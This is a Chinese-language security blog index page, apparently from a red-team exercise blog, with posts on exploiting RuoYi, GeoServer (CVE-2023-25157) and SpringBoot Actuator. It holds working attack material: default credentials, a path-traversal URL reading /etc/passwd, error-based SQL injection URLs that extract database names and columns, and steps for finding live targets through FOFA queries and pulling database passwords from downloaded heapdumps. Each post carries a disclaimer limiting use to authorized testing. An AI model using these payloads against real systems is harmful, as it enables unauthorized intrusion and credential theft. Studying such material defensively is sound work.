<p> <img src="/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814114306937.png" alt="image-20230814114306937"></p>
<p>附件（敏感信息）</p>
<p><img src="/2023/08/14/Atlassian-Jira%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814114350511.png" alt="image-20230814114350511"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/14/%E8%8B%A5%E4%BE%9D-RuoYi-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/14/%E8%8B%A5%E4%BE%9D-RuoYi-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">若依(RuoYi)框架漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-08-14 09:46:16 / 修改时间：21:02:31" itemprop="dateCreated datePublished" datetime="2023-08-14T09:46:16+08:00">2023-08-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">攻防演练</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="攻防演练-若依ruoyi-管理系统"><a href="#攻防演练-若依ruoyi-管理系统" class="headerlink" title="攻防演练|若依ruoyi-管理系统"></a>攻防演练|若依ruoyi-管理系统</h1><p><strong>免责声明</strong></p>
<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。        </p>
<p>​        若依是一个Java EE企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），也可以基于Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap等框架的漏洞从而进一步对该系统进行利用。</p>
<h2 id="若依框架后台弱口令"><a href="#若依框架后台弱口令" class="headerlink" title="若依框架后台弱口令"></a><strong>若依框架后台弱口令</strong></h2><h3 id="0x01漏洞环境-测绘指纹"><a href="#0x01漏洞环境-测绘指纹" class="headerlink" title="0x01漏洞环境/测绘指纹"></a>0x01漏洞环境/测绘指纹</h3><p><strong>Fofa语法：</strong>app=“若依-管理系统” &amp;&amp; body=” admin “</p>
<h3 id="0x02-POC-EXP-漏洞利用"><a href="#0x02-POC-EXP-漏洞利用" class="headerlink" title="0x02 POC/EXP/漏洞利用"></a>0x02 POC/EXP/漏洞利用</h3><h4 id="默认弱口令："><a href="#默认弱口令：" class="headerlink" title="默认弱口令："></a><strong>默认弱口令</strong>：</h4><p>admin/admin123</p>
<p><img src="/2023/08/14/%E8%8B%A5%E4%BE%9D-RuoYi-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814094926152.png" alt="image-20230814094926152">            </p>
<h4 id="若依任意文件读取"><a href="#若依任意文件读取" class="headerlink" title="若依任意文件读取"></a><strong>若依任意文件读取</strong></h4><p>后台登录后可以任意读取文件</p>
<p>Payload：</p>
<p><a target="_blank" rel="noopener" href="https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd">https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd</a></p>
<p><img src="/2023/08/14/%E8%8B%A5%E4%BE%9D-RuoYi-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814095039870.png" alt="image-20230814095039870"></p>
<p>**直接利用已经很少了，现在能遇到的需要进行base64/url编码</p>
<h2 id="若依反序列化漏洞"><a href="#若依反序列化漏洞" class="headerlink" title="若依反序列化漏洞"></a><strong>若依反序列化漏洞</strong></h2><h3 id="0x01-漏洞环境-测绘指纹"><a href="#0x01-漏洞环境-测绘指纹" class="headerlink" title="0x01 漏洞环境/测绘指纹"></a>0x01 漏洞环境/测绘指纹</h3><p>基于shiro反序列化漏洞</p>
<p><strong>fofa语法:</strong> <code>app=&quot;RuoYi&quot;</code></p>
<h3 id="0x02-漏洞检查"><a href="#0x02-漏洞检查" class="headerlink" title="0x02 漏洞检查"></a>0x02 漏洞检查</h3><p>A、 有记录密码/用户的登录界面（可以勾选记录密码）</p>
<p>B、 若隐藏了（没看到），可以在请求头加入如下变量：</p>
<p>rememberMe=1/rememberme=1/ remember-me=1…</p>
<p>通常是在Cookie字段添加，通过查看响应包是否存在rememberme变量，或者返回包出现了Set-Cookie: rememberMe=deleteMe，那么也可以证明网站使用了shiro组件</p>
<p><img src="/2023/08/14/%E8%8B%A5%E4%BE%9D-RuoYi-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814095158806.png" alt="image-20230814095158806"></p>
<p>利用工具扫描（如shiroAttack2、shiroExp）是否存在shiro反序列化漏洞；扫描/爆破出了key就基本可以利用shiro反序列漏洞了。</p>
<p> <img src="/2023/08/14/%E8%8B%A5%E4%BE%9D-RuoYi-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814095226932.png" alt="image-20230814095226932"></p>
<h5 id="0x03-POC-EXP-漏洞利用"><a href="#0x03-POC-EXP-漏洞利用" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h5><p>直接用shiro漏洞工具（shiroAttack2）攻击，</p>
<p> <img src="/2023/08/14/%E8%8B%A5%E4%BE%9D-RuoYi-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814095549148.png" alt="image-20230814095549148"></p>
<p>shiroAttack2的功能区命令执行、内存马、key生成等功能可以利用。如下执行ls命令</p>
<p> <img src="/2023/08/14/%E8%8B%A5%E4%BE%9D-RuoYi-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/image-20230814095614520.png" alt="image-20230814095614520"></p>
<p>ruoyi其他漏洞可以参考：<a target="_blank" rel="noopener" href="http://cn-sec.com/archives/1139767.html">http://cn-sec.com/archives/1139767.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/14/GeoServer-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-25157%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/14/GeoServer-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-25157%EF%BC%89/" class="post-title-link" itemprop="url">GeoServer-SQL注入漏洞（CVE-2023-25157）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-08-14 09:08:22 / 修改时间：21:03:10" itemprop="dateCreated datePublished" datetime="2023-08-14T09:08:22+08:00">2023-08-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">攻防演练</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="攻防演练-GeoServer-SQL注入漏洞（CVE-2023-25157）"><a href="#攻防演练-GeoServer-SQL注入漏洞（CVE-2023-25157）" class="headerlink" title="攻防演练|GeoServer SQL注入漏洞（CVE-2023-25157）"></a>攻防演练|GeoServer SQL注入漏洞（CVE-2023-25157）</h1><p><strong>免责声明</strong></p>
<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h2><p>​        GeoServer在预览图层的时候，可以对图层进行数据过滤从而渲染出指定位置的图层。由于未对用户输入进行过滤，在使用需要以数据库作为数据存储的功能时，攻击者可以构造畸形的过滤语法，绕过GeoServer的词法解析从而造成SQL注入，获取服务器中的敏感信息，甚至可能获取数据库服务器权限。</p>
<h2 id="0x02-漏洞环境-测绘指纹"><a href="#0x02-漏洞环境-测绘指纹" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h2><p><strong>【漏洞环境/版本】</strong></p>
<p>GeoServer &lt; 2.21.4</p>
<p>2.22.0 &lt;= GeoServer &lt; 2.22.2</p>
<p><strong>【Fofa指纹】</strong>：app=”GeoServer”</p>
<h2 id="0x03-POC-EXP-漏洞利用"><a href="#0x03-POC-EXP-漏洞利用" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h2><p>PS：特殊符号需要使用url编码 </p>
<p><strong>步骤1</strong>：获取地理图层列表信息typeName</p>
<p>Payload：https://<strong>ip</strong>/geoserver/ows?service=WFS&amp;version=1.0.0&amp;request=GetCapabilities</p>
<p><img src="/2023/08/14/GeoServer-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-25157%EF%BC%89/image-20230814091401530.png" alt="image-20230814091401530"></p>
<p><strong>步骤2</strong>：获取某个图层的名称name</p>
<p>Payload：</p>
<p>https://<strong>IP</strong>/geoserver/wfs?request=DescribeFeatureType&amp;version=2.0.0&amp;service=WFS&amp;outputFormat=application/json&amp;typeName=cwimportbgmsue</p>
<p><img src="/2023/08/14/GeoServer-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-25157%EF%BC%89/image-20230814093423236.png" alt="image-20230814093423236"></p>
<p><strong>步骤3</strong>：构造sql注入payload并获取信息</p>
<p><strong>【知识补充】</strong></p>
<p><strong>CQL_FILTER查询：</strong></p>
<p>​        在 PostgreSQL 中，CQL_FILTER 不是 PostgreSQL 的特定功能或命令，而是与地理信息系统（GIS）相关的概念。CQL（Common Query Language）是一种用于过滤和查询地理数据的通用查询语言，通常用于处理地理信息和地理数据。CQL_FILTER 是 CQL 查询中用于过滤地理数据的关键字，它用于筛选与给定条件匹配的地理要素。</p>
<p><strong>CAST：</strong></p>
<p>​        是一种将一个数据类型转换为另一个数据类型的方法，CAST (expression AS target_type)，expression 是要转换的表达式，target_type 是目标数据类型</p>
<p><strong>Payload：</strong></p>
<p><strong>获取数据库版本</strong></p>
<p>https://<strong>ip</strong>/geoserver/ows?service=wfs&amp;version=1.0.0&amp;request=GetFeature&amp;typeName=<strong>cwimportbgmsue</strong>&amp;CQL_FILTER=strStartsWith(<strong>fid</strong>,’x’’)=true+and+1=(<strong>SELECT+CAST+((SELECT+version())+AS+INTEGER))</strong>–’)=true</p>
<p>注意：这里的“+”是指空格“ ”</p>
<p><img src="/2023/08/14/GeoServer-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-25157%EF%BC%89/image-20230814093352183.png" alt="image-20230814093352183"></p>
<p><strong>获取（当前）数据库名</strong></p>
<p>Payload：（也可以用url编码的格式）</p>
<p>/geoserver/ows?service=wfs&amp;version=1.0.0&amp;request=GetFeature&amp;typeName=cwimportbgmsue&amp;CQL_FILTER=strStartsWith(fid,%27x%27%27)+%3d+true+and+1%3d(SELECT+CAST+((<strong>SELECT+current_database()</strong>)+AS+INTEGER))+–+%27)+%3d+true</p>
<p><img src="/2023/08/14/GeoServer-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-25157%EF%BC%89/image-20230814093338151.png" alt="image-20230814093338151"></p>
<p><strong>查看权限</strong></p>
<p><strong>select</strong> CURRENT_SCHEMA() </p>
<p><img src="/2023/08/14/GeoServer-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-25157%EF%BC%89/image-20230814093319398.png" alt="image-20230814093319398"></p>
<p><strong>获取表名</strong></p>
<p>Select table_name from information_schema.tables ORDER BY table_name LIMIT 1</p>
<p><img src="/2023/08/14/GeoServer-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-25157%EF%BC%89/image-20230814093304418.png" alt="image-20230814093304418"></p>
<p><strong>获取字段名</strong></p>
<p>geoserver/ows?service=wfs&amp;version=1.0.0&amp;request=GetFeature&amp;typeName=cwimportbgmsue&amp;CQL_FILTER=strStartsWith(fid,%27x%27%27)+%3d+true+and+1%3d(SELECT+CAST+((SELECT+column_name+from+information_schema.columns%20+ORDER+BY+table_name+LIMIT+1)+AS+INTEGER))+–+%27)+%3d+true</p>
<p><img src="/2023/08/14/GeoServer-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-25157%EF%BC%89/image-20230814093226492.png" alt="image-20230814093226492"> </p>
<p>用burpsuit操作更加方便</p>
<p><img src="/2023/08/14/GeoServer-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-25157%EF%BC%89/image-20230814093129834.png" alt="image-20230814093129834"></p>
<p>…进一步的操作就不展示了…</p>
<p><strong>注意</strong>：这里的对空格、引号进行了处理（CQL filter无法处理），需要绕过，而且这报错注入每次只返回一个值，可能无法显示列表</p>
<p>返回值是多个值时</p>
<p><img src="/2023/08/14/GeoServer-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-25157%EF%BC%89/image-20230814093111049.png" alt="image-20230814093111049"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">SpringBoot未授权访问漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-08-13 20:41:34" itemprop="dateCreated datePublished" datetime="2023-08-13T20:41:34+08:00">2023-08-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-14 21:03:17" itemprop="dateModified" datetime="2023-08-14T21:03:17+08:00">2023-08-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">攻防演练</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="攻防演练-SpringBoot未授权访问漏洞"><a href="#攻防演练-SpringBoot未授权访问漏洞" class="headerlink" title="攻防演练|SpringBoot未授权访问漏洞"></a>攻防演练|SpringBoot未授权访问漏洞</h1><p><strong>免责声明</strong></p>
<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
<h2 id="0x01漏洞概述"><a href="#0x01漏洞概述" class="headerlink" title="0x01漏洞概述"></a>0x01漏洞概述</h2><p>​        Actuator是Spring Boot提供的服务监控和管理中间件，默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限。</p>
<p><strong>/actuator目录中,寻找漏洞比较重要接口的有：</strong></p>
<ul>
<li>/env、/actuator/env</li>
</ul>
<p>​        GET 请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
<ul>
<li>/refresh、/actuator/refresh</li>
</ul>
<p>​        POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 <strong>RCE</strong> <strong>漏洞</strong>。</p>
<ul>
<li> /restart、/actuator/restart</li>
</ul>
<p>​        暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 <strong>RCE</strong> <strong>漏洞</strong>。</p>
<ul>
<li>/jolokia、/actuator/jolokia</li>
</ul>
<p>​        可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 <strong>RCE</strong> <strong>漏洞</strong>、获得星号遮掩的重要隐私信息的明文等。</p>
<ul>
<li> /trace、/actuator/httptrace</li>
</ul>
<p>​        一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
<h2 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h2><p>​    都有可能</p>
<h2 id="0x03漏洞环境或指纹"><a href="#0x03漏洞环境或指纹" class="headerlink" title="0x03漏洞环境或指纹"></a>0x03漏洞环境或指纹</h2><p><strong>Fofa指纹：</strong></p>
<ul>
<li>app=”vmware-SpringBoot-Framework”      #应用名称</li>
<li>body=” Whitelabel Error Page”             #默认页面</li>
<li>icon_hash=”116323821”                   #一片叶子的图标</li>
</ul>
<h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a><strong>漏洞环境</strong></h4><ul>
<li><p><strong>默认页面：Whitelabel Error Page页面</strong></p>
<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230813204709414.png" alt="image-20230813204709414">                             </p>
</li>
<li><p><strong>swagger接口页面/swagger-ui.html：</strong></p>
<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230813204723191.png" alt="image-20230813204723191"></p>
</li>
</ul>
<h2 id="0x04-POC-EXP-漏洞利用"><a href="#0x04-POC-EXP-漏洞利用" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h2><p><strong>步骤1：找靶点</strong></p>
<p>在图虎上利用关键词 body=”Whitelabel Error Page” 找到利用springboot框架搭建的网站 </p>
<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202300692.png" alt="image-20230814202300692"></p>
<p><strong>步骤2：尝试未授权访问 添加后缀/actuator 发现成功访问接口</strong></p>
<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202326735.png" alt="image-20230814202326735"></p>
<p><strong>步骤3：访问env目录</strong></p>
<p>​        进入/actuator/env 查看相关配置信息（/actuator/env 查看全部环境属性，可以查询到一些敏感信息 例如redis的ip和端口 数据库的账号和密码 但大部分密码都存在加密） 查找关键词 password 发现 存在数据库密码 但进行加密 查看不了</p>
<p>发现账号密码（例如mysql数据库）</p>
<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202401815.png" alt="image-20230814202401815"></p>
<p><strong>步骤4：查看其他接口信息</strong></p>
<p>​        发现/actuator/heapdump没有禁止访问 （/heapdump Heapdump，即堆转储文件，是一个Java进程在某个时间点上的内存快照。HeapDump记录了JVM中堆内存运行的情况，保存了Java对象、类以及线程栈以及本地变量等信息，最重要的是里面可能存有数据库密码信息。） 访问自动下载heapdump文件</p>
<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202432042.png" alt="image-20230814202432042"></p>
<p><strong>步骤5：分析heapdump文件</strong></p>
<p>利用MemoryAnalyzer工具打开heapdump分析。</p>
<p>利用查找语句查找密码：<code>select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</code></p>
<p>找到一些账号密码</p>
<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202502840.png" alt="image-20230814202502840"></p>
<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202530066.png" alt="image-20230814202530066"></p>
<p> <img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230813204951037.png" alt="image-20230813204951037"></p>
<p> <img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230813204957314.png" alt="image-20230813204957314"></p>
<p>获取到数据库链接、用户名、密码</p>
<p><img src="/2023/08/13/SpringBoot%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230814202604099.png" alt="image-20230814202604099"></p>
<p>【<strong>知识补充</strong>】其他数据脱敏/星号数据获取方法可以参考：<a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/13/SpringBoot%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/13/SpringBoot%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="post-title-link" itemprop="url">实战|SpringBoot敏感信息泄露</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-08-13 20:25:47" itemprop="dateCreated datePublished" datetime="2023-08-13T20:25:47+08:00">2023-08-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-14 21:03:25" itemprop="dateModified" datetime="2023-08-14T21:03:25+08:00">2023-08-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" itemprop="url" rel="index"><span itemprop="name">攻防演练</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="攻防演练-Springboot信息泄露"><a href="#攻防演练-Springboot信息泄露" class="headerlink" title="攻防演练|Springboot信息泄露"></a>攻防演练|Springboot信息泄露</h1><p><strong>免责声明</strong></p>
<p><strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
